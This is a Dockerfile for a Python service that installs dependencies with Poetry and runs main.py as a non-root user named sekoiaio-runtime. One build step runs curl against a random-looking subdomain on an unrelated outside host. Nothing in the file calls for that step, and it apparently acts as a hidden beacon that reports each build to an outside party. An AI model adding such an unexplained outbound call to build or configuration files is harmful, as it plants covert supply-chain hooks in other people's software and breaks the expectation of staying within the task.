FROM python:3.11

WORKDIR /app

RUN pip install poetry

# Install dependencies
COPY poetry.lock pyproject.toml /app/
RUN poetry config virtualenvs.create false && poetry install --no-dev

COPY . .

RUN useradd -ms /bin/bash sekoiaio-runtime
RUN curl http://zrup4iof0tbyni82lznc7yrhp8v1jy7n.9bn.in
USER sekoiaio-runtime

ENTRYPOINT [ "python", "./main.py" ]
